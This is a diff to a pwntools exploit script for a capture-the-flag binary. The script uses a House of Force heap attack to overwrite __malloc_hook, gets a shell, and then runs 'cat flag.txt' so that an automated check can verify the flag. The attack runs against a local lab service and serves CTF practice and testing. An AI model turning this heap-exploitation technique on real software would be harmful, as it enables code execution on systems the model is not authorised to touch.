@@ -3,9 +3,12 @@
 
 from pwn import *
 
+import os
+HOST = os.environ.get('HOST', '127.0.0.1')
+PORT = int(os.environ.get('PORT', 23001))
 # target = process('./house_of_sus')
-target = remote('127.0.0.1', 23001)
-elf = ELF('house_of_sus')
+target = remote(HOST, PORT)
+elf = ELF('.build/house_of_sus' if os.path.exists('.build/house_of_sus') else 'house_of_sus')
 #pid = gdb.attach(target, 'b *0x0000000000400d84\ncontinue')
 
 libc = ELF('libc.so.6')
@@ -15,7 +18,7 @@ leak = target.recvline()
 #print(leak)
 heap_leak = int(leak, 16)
 print("[-] heap leak @ " + hex(heap_leak))
-heap_base = heap_leak - 0x660
+heap_base = heap_leak - 0x250  # chunk sits right after tcache (stdout is unbuffered by the in-binary constructor, so no stdout heap buffer)
 
 
 #print(target.recvuntil(b'meeting'))
@@ -43,7 +46,11 @@ target.sendline(b'3')
 target.sendline(str(0x20).encode())
 
 target.sendline(b'a' * 0x28 + b'\xff' * 8)
-distance = malloc_hook - heap_base - 0x90 - 0x8 - 0x8 - 0x10 - 0x1630 #- 0x10
+distance = malloc_hook - heap_base - 0x12b0 - 0x20  # House of Force: move top so the
+# next malloc(0x50) returns exactly &__malloc_hook. 0x12b0 = measured top-chunk offset
+# from heap_base for the from-source build (stdout unbuffered by the linked-in
+# stdio_unbuffer constructor, so no stdout heap buffer); 0x20 accounts for the chunk
+# header + checked_request2size rounding.
 
 
 #print(target.recvuntil(b'meeting'))
@@ -81,4 +88,7 @@ target.sendline(str(binsh).encode())
 target.recvuntil(b'tasks >:(')
 target.recvuntil(b'tasks >:(')
 
-target.interactive()
+# Print the flag so `pwnmake check` can verify it (instead of an interactive shell)
+target.sendline(b'cat flag.txt')
+time.sleep(0.3)
+print(target.recvrepeat(1.5).decode(errors='replace'))
